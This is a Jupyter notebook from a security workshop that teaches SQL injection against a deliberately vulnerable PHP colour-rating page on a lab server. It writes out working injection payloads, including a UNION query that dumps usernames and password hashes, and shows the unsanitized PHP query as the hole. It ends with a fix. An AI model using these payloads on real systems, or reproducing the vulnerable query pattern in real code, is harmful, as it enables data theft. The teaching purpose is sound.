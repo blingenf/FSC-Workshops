{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WORKSHOP 1: Web Penetration Testing 1\n",
    "## Part one: SQL injection\n",
    "In the first exercize, we'll be doing the \"hello world\" of injection attacks. The first page, \"Home\" uses a PHP backend which makes queries to a SQL server for data. Let's take a look:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"100%\"\n",
       "            height=\"400\"\n",
       "            src=\"http://172.16.4.60/ws1/index.php\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x7f4390bba3c8>"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import IFrame, HTML\n",
    "\n",
    "# I'm declaring URL as a global variable because the workshop\n",
    "# is located on a local IP which is subject to change.\n",
    "# Make sure you run this code first to declare the variable.\n",
    "URL = 'http://172.16.4.60/ws1/index.php'\n",
    "\n",
    "IFrame(URL, width='100%', height=400)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "To get a better idea of what's happenning with the search box, let's look at the html:\n",
    "```html\n",
    "<h2>Search</h2>\n",
    " <form action=\"index.php\" method=\"post\">\n",
    "   <label for=\"name\">Color Search</label>\n",
    "   <input type=\"text\" id=\"colorsearch\" name=\"colorsearch\">\n",
    "</form>\n",
    "```\n",
    "`method=\"post\"` tells us that the query is making an HTML POST request. This means that the request data is passed along in the body of the request, rather than the request URL (Request types will be covered in more detail next workshop, but for now just know that this is the right request type to use here),\n",
    "\n",
    "`name=\"colorsearch\"` tells us that the parameter we're POSTing is titled \"colorsearch\". This is the parameter the html form is filling and sending to the server each time you type something in the search field and hit enter.\n",
    "\n",
    "The first thing we'll do is write some python code to automate this request process. For a problem like this it's perfectly reasonable to do the whole thing in-browser, but we'll need Python Requests for next three pages so let's start using it now."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>Search</h2>\n",
       "    <form action=\"index.php\" method=\"post\">\n",
       "      <label for=\"name\">Color Search</label>\n",
       "      <input type=\"text\" id=\"colorsearch\" name=\"colorsearch\">\n",
       "    </form>\n",
       "    <h2>Ratings table</h2>\n",
       "      </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "response = requests.get(URL)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Great! It doesn't look pretty, but this'll do. Recall that we're making a POST request. Let's change the Python Requests code to match that:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>Search</h2>\n",
       "    <form action=\"index.php\" method=\"post\">\n",
       "      <label for=\"name\">Color Search</label>\n",
       "      <input type=\"text\" id=\"colorsearch\" name=\"colorsearch\">\n",
       "    </form>\n",
       "    <h2>Ratings table</h2>\n",
       "    <table>\n",
       "<tr><td>Red</td><td style='background-color:#FF0000; width:50px;'></td><td>6/10</td></tr>\n",
       "</table>\n",
       "  </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Here's our POST payload:\n",
    "payload = {\"colorsearch\" : \"red\"}\n",
    "response = requests.post(URL, data=payload)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Try changing \"red\" to \"blue\" to make sure you have a good idea of how this is working.\n",
    "\n",
    "So, what's the security issue here? You can't see it without having access to the server, but here's what the PHP code handling that request looks like:\n",
    "```PHP\n",
    "// Get results from MySQL\n",
    "\\$link = mysqli_connect(\"127.0.0.1\",\"ws1home\",\"<password>\",\"workshop1\");\n",
    "\\$color = \\$_POST[\"colorsearch\"];\n",
    "\\$query = \"select * from colors where cname = '\" . \\$color . \"';\";\n",
    "\\$result = \\$link->query(\\$query);\n",
    "\n",
    "// Print out table containing results:\n",
    "echo \"<table>\\n\";\n",
    "while (\\$row = \\$result->fetch_row()) {\n",
    "    echo \"<tr><td>\" . \\$row[0] . \"</td><td style='background-color:#\" . \\$row[1]\n",
    "         . \"; width:50px;'></td><td>\" . \\$row[2] . \"/10</td></tr>\\n\";\n",
    "}\n",
    "echo \"</table>\\n\";\n",
    "\n",
    "mysqli_close(\\$link);\n",
    "```\n",
    "(Note: the \\\\\\$ are due to issues with Jupyter code markdown and MathJax. The actual code has no backslashes)\n",
    "\n",
    "The problem code is here:\n",
    "```PHP\n",
    "\\$color = \\$_POST[\"colorsearch\"];\n",
    "\\$query = \"select * from colors where cname = '\" . \\$color . \"';\";\n",
    "```\n",
    "We're taking the raw contents of `colorsearch`, then dumping them into the following query:\n",
    "```MySQL\n",
    "SELECT * FROM colors WHERE cname='<input>';\n",
    "```\n",
    "Because the input is not sanitized in any way, there's nothing to stop the attacker from using SQL special characters in their request. For example, an input of `' OR 1=1` generates the following SQL query:\n",
    "```MySQL\n",
    "SELECT * FROM colors WHERE cname='' OR 1=1';\n",
    "```\n",
    "That stray apostrophe is going to cause issues, but because the comment symbol isn't filtered out either we can simply add a comment to our input and get rid of it: `' OR 1=1; #`. Now, the query looks like this:\n",
    "```MySQL\n",
    "SELECT * FROM colors WHERE cname='' OR 1=1; #';\n",
    "```\n",
    "`#` is a comment in MySQL, so everything after it is ignored. Our query is therefore simply:\n",
    "```MySQL\n",
    "SELECT * FROM colors WHERE cname='' OR 1=1;\n",
    "```\n",
    "### Attack\n",
    "Let's try it with the python code:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>Search</h2>\n",
       "    <form action=\"index.php\" method=\"post\">\n",
       "      <label for=\"name\">Color Search</label>\n",
       "      <input type=\"text\" id=\"colorsearch\" name=\"colorsearch\">\n",
       "    </form>\n",
       "    <h2>Ratings table</h2>\n",
       "    <table>\n",
       "<tr><td>White</td><td style='background-color:#FFFFFF; width:50px;'></td><td>7/10</td></tr>\n",
       "<tr><td>Silver</td><td style='background-color:#C0C0C0; width:50px;'></td><td>6/10</td></tr>\n",
       "<tr><td>Red</td><td style='background-color:#FF0000; width:50px;'></td><td>6/10</td></tr>\n",
       "<tr><td>Olive</td><td style='background-color:#80800; width:50px;'></td><td>5/10</td></tr>\n",
       "<tr><td>Yellow</td><td style='background-color:#FFF000; width:50px;'></td><td>7/10</td></tr>\n",
       "<tr><td>Lime</td><td style='background-color:#00FF00; width:50px;'></td><td>6/10</td></tr>\n",
       "<tr><td>Green</td><td style='background-color:#008000; width:50px;'></td><td>7/10</td></tr>\n",
       "<tr><td>Blue</td><td style='background-color:#0000FF; width:50px;'></td><td>7/10</td></tr>\n",
       "<tr><td>Navy</td><td style='background-color:#000080; width:50px;'></td><td>8/10</td></tr>\n",
       "<tr><td>Purple</td><td style='background-color:#800080; width:50px;'></td><td>8/10</td></tr>\n",
       "</table>\n",
       "  </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "payload = {\"colorsearch\" : \"' OR 1=1; #\"}\n",
    "response = requests.post(URL, data=payload)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sure enough, all the colors show up. This is not the intended functionality of the service, so there's already a fairly serious security issue here. This isn't the worst of it though; this one vulnerability is actually enough for us to extract information from other tables. Now that we know we can perform an injection, we can start looking at more interesting information:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>Search</h2>\n",
       "    <form action=\"index.php\" method=\"post\">\n",
       "      <label for=\"name\">Color Search</label>\n",
       "      <input type=\"text\" id=\"colorsearch\" name=\"colorsearch\">\n",
       "    </form>\n",
       "    <h2>Ratings table</h2>\n",
       "    <table>\n",
       "<tr><td>colors</td><td style='background-color:#1; width:50px;'></td><td>cname/10</td></tr>\n",
       "<tr><td>colors</td><td style='background-color:#1; width:50px;'></td><td>code/10</td></tr>\n",
       "<tr><td>colors</td><td style='background-color:#1; width:50px;'></td><td>rating/10</td></tr>\n",
       "<tr><td>users1</td><td style='background-color:#1; width:50px;'></td><td>username/10</td></tr>\n",
       "<tr><td>users1</td><td style='background-color:#1; width:50px;'></td><td>password/10</td></tr>\n",
       "</table>\n",
       "  </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# My query is now so long that I'm wrapping it to 2 lines\n",
    "# The \\ just tells python to act like there isn't a newline\n",
    "query = \"' UNION SELECT table_name, 1, column_name FROM information_schema.columns \" \\\n",
    "        + \"WHERE table_schema NOT IN ('sys', 'information_schema', 'performance_schema','mysql'); #\"\n",
    "    \n",
    "payload = {\"colorsearch\" : query}\n",
    "response = requests.post(URL, data=payload)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Woah, what just happened?\n",
    "\n",
    "This workshop is focusing mainly on concepts rather than specific attacks so I won't go too far into the weeds, but here's the basics of what that injection is doing:\n",
    "\n",
    "- `UNION`: This combines the outputs of two queries into a single table. I don't care about what's in the colors table, but we can't get rid of that part of the query; instead, I UNION the result of the query I don't care about with a new query, which I do care about.\n",
    "\n",
    "- `FROM information_schema.columns`: Skipping ahead a bit, we find the database and table I'm selecting from. MySQL syntax is `<database name>.<table name>`, so I'm selecting from the `columns` table in the `information_schema` database. `information_schema` contains all of MySQL's metadata. We can go here to find out what other interesting tables to SELECT from.\n",
    "\n",
    "- `SELECT table_name, 1, column_name`: So, where did these columns come from and why am I selecting `1`? The goal of this query is to get all the names of all the columns for all the talbes. `table_name` and `column_name` are simply columns in the `columns` table containing information I need. The `1` part doesn't actually mean anything, but a `UNION` query only works if the 2 tables being combined have the same number of columns. The `colors` table has 3 columns, so I add an extra column containing nothing but 1s to make sure everything lines up.\n",
    "\n",
    "- `WHERE table_schema NOT IN ('sys', 'information_schema', 'performance_schema','mysql')`: So what's this mess? This is some MySQL specific filtering which basically just gets rid of anything from databases we don't care about. It's a mess, but if you delete this part you'll see why I'm inluding it\n",
    "\n",
    "Now, let's look at what this result is actually telling us. We already know about the `colors` table, so that isn't very interesting. The users table, on the other hand, seems like it might have some valuable information. Let's select from that table."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>Search</h2>\n",
       "    <form action=\"index.php\" method=\"post\">\n",
       "      <label for=\"name\">Color Search</label>\n",
       "      <input type=\"text\" id=\"colorsearch\" name=\"colorsearch\">\n",
       "    </form>\n",
       "    <h2>Ratings table</h2>\n",
       "    <table>\n",
       "<tr><td>Alice</td><td style='background-color:#1; width:50px;'></td><td>5f4dcc3b5aa765d61d8327deb882cf99/10</td></tr>\n",
       "<tr><td>Bob</td><td style='background-color:#1; width:50px;'></td><td>e10adc3949ba59abbe56e057f20f883e/10</td></tr>\n",
       "<tr><td>Carol</td><td style='background-color:#1; width:50px;'></td><td>1e6947ac7fb3a9529a9726eb692c8cc5/10</td></tr>\n",
       "<tr><td>Dan</td><td style='background-color:#1; width:50px;'></td><td>32250170a0dca92d53ec9624f336ca24/10</td></tr>\n",
       "<tr><td>FLAG</td><td style='background-color:#1; width:50px;'></td><td>1jHz6AdGFxHXNlf5/10</td></tr>\n",
       "</table>\n",
       "  </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query = \"' UNION SELECT username, 1, password FROM users1; #\"\n",
    "    \n",
    "payload = {\"colorsearch\" : query}\n",
    "response = requests.post(URL, data=payload)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The \"/10\" is only there because the webpage is expected a number out of 10 to place on the page. Congratulations! You've successfully found the flag for page 1.\n",
    "\n",
    "### Defense\n",
    "Here's how you can protect against this attack:\n",
    "\n",
    "Change `$color = $_POST[\"colorsearch\"];` to `$color = mysql_real_escape_string($_POST[\"colorsearch\"]);`.\n",
    "\n",
    "That tiny change is all you need to do to fix one of the most common and impactful attacks on the web. Sanitizing every input you take in is both the most basic and most critical security measure.\n",
    "\n",
    "<i>(Note: using prepared statements is an even better way to deal with injection, but that's out of the scope of this workshop)</i>\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
